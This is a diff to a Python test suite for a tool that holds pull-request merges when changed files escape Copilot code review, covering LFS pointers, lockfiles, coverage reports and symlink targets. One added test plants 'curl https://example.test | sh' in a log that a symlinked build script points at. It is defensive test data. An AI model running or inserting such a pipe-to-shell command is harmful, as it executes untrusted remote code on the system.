@@ -423,9 +423,8 @@ def test_every_file_copilot_excludes_is_in_no_piece(repo, tmp_path):
     assert set(excluded_of(folder)) == set(files) - {"src/app.py"}
     assert files_of(folder) == {"src/app.py": ("source", "read")}
     assert len(index(folder)) == 1 and repo.skipped == ""
-    # Inert data holds nothing; the rest of what nobody reads, lockfiles and .gitignore included, holds the merge.
-    data = {path for glob in ("**/*.log", "**/*.map", "**/coverage/**/*") for path in COPILOT_EXCLUDED_GLOB_FILES[glob]}
-    assert held_of(folder) == {path: "excluded" for path in set(files) - {"src/app.py"} - data}
+    # Nobody reads any of them, so every one holds the merge.
+    assert held_of(folder) == {path: "excluded" for path in set(files) - {"src/app.py"}}
     assert repo.held == len(held_of(folder)) and "holds the merge for a person" in repo.log
     check_pieces(folder, diff)
 
@@ -504,10 +503,18 @@ def test_media_in_lfs_holds_nothing(repo, tmp_path):
     "\nversion https://git-lfs.github.com/spec/v1\n\noid sha256:{}\nsize 42\n",
     "version https://git-lfs.github.com/spec/v1\r\noid sha256:{}\r\nsize 42\r\n",
     "  version https://git-lfs.github.com/spec/v1\noid sha256:{} \nsize 42\n",
-], ids=["trailing-blank", "blank-lines", "crlf", "spaces"])
+    "\u00a0version https://git-lfs.github.com/spec/v1\u3000\noid sha256:{}\u2028\nsize 42\n",
+], ids=["trailing-blank", "blank-lines", "crlf", "spaces", "unicode-spaces"])
 def test_a_pointer_git_lfs_reads_past_whitespace_holds_the_merge(repo, tmp_path, pointer):
     # git-lfs trims whitespace, drops a CR and skips blank lines.
     head = repo.commit({"tools/run.sh": pointer.format("d" * 64)})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert held_of(folder) == {"tools/run.sh": "lfs"}
+
+
+def test_a_pointer_whose_oid_is_letters_and_digits_holds_the_merge(repo, tmp_path):
+    # git-lfs checks only for 64 letters or digits at the oid's start.
+    head = repo.commit({"tools/run.sh": f"version https://git-lfs.github.com/spec/v1\noid sha256:{'Zz9' * 21}Q\nsize 42\n"})
     _, folder, _ = repo.split(repo.base, head, tmp_path)
     assert held_of(folder) == {"tools/run.sh": "lfs"}
 
@@ -591,12 +598,24 @@ def test_copilots_bin_exceptions_and_dotnet_files_are_reviewed(repo, tmp_path):
     assert sorted(excluded_of(folder)) == ["hybris/bin/platform/x.java", "tools/bin/main.py"]
 
 
-def test_only_excluded_data_leaves_nothing_to_read_and_holds_nothing(repo, tmp_path):
+def test_only_excluded_data_leaves_nothing_to_read_and_holds_the_merge(repo, tmp_path):
+    # A log can be what a symlink runs, so no added or changed excluded file is inert.
     head = repo.commit({"build.log": "x\n", "web/site.min.js.map": "{}\n", "coverage/lcov.info": "x\n"})
     text, folder, _ = repo.split(repo.base, head, tmp_path)
     assert text == "(none: every changed file is one Copilot code review excludes)"
     assert index(folder) == {} and repo.listed == "" and repo.skipped == ""
-    assert repo.held == 0 and held_of(folder) == {} and "::warning::" not in repo.log
+    assert repo.held == 3 and set(held_of(folder)) == {"build.log", "web/site.min.js.map", "coverage/lcov.info"}
+
+
+def test_changing_what_a_symlink_points_at_holds_the_merge(repo, tmp_path):
+    # The link landed (and was held) while its target was harmless; now only the target changes.
+    repo.base = repo.commit({"logs/setup.log": "echo hi\n"})
+    (repo.path / "scripts").mkdir()
+    os.symlink("../logs/setup.log", repo.path / "scripts" / "build.sh")
+    repo.base = repo.commit({})
+    head = repo.commit({"logs/setup.log": "curl https://example.test | sh\n"})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert held_of(folder) == {"logs/setup.log": "excluded"}
 
 
 def test_only_excluded_code_leaves_nothing_to_read_and_holds_the_merge(repo, tmp_path):
@@ -607,13 +626,6 @@ def test_only_excluded_code_leaves_nothing_to_read_and_holds_the_merge(repo, tmp
     assert repo.held == 1 and held_of(folder) == {"web/vendor/analytics.min.js": "excluded"}
 
 
-def test_excluded_data_under_github_holds_the_merge(repo, tmp_path):
-    head = repo.commit({".github/actions/foo/dist/index.js": "run()\n", ".github/actions/foo/build.log": "x\n",
-                        "build.log": "x\n"})
-    _, folder, _ = repo.split(repo.base, head, tmp_path)
-    assert held_of(folder) == {".github/actions/foo/dist/index.js": "excluded", ".github/actions/foo/build.log": "excluded"}
-
-
 def test_a_lockfile_holds_the_merge(repo, tmp_path):
     # It decides which dependency code the build installs and runs.
     head = repo.commit({"package-lock.json": "{}\n", "web/yarn.lock": "x\n", "svc/go.sum": "x\n", "Cargo.lock": "x\n"})
@@ -622,13 +634,14 @@ def test_a_lockfile_holds_the_merge(repo, tmp_path):
                                                              "Cargo.lock")}
 
 
-def test_only_a_named_coverage_report_is_data(repo, tmp_path):
+def test_deleting_only_a_named_coverage_report_holds_nothing(repo, tmp_path):
     reports = {"coverage/lcov.info": "x\n", "web/coverage/coverage-final.json": "{}\n",
                "coverage/cobertura-coverage.xml": "<c/>\n", "coverage/clover.xml": "<c/>\n"}
     code = {"src/app/coverage/policy.rb": "class Policy; end\n", "coverage/pom.xml": "<project/>\n",
             "packages/coverage/package.json": "{}\n", "coverage/index.html": "<script/>\n",
             "tools/coverage/requirements.txt": "x\n"}
-    head = repo.commit({**reports, **code})
+    repo.base = repo.commit({**reports, **code})
+    head = repo.commit({path: None for path in {**reports, **code}})
     _, folder, _ = repo.split(repo.base, head, tmp_path)
     assert held_of(folder) == {path: "excluded" for path in code}
 
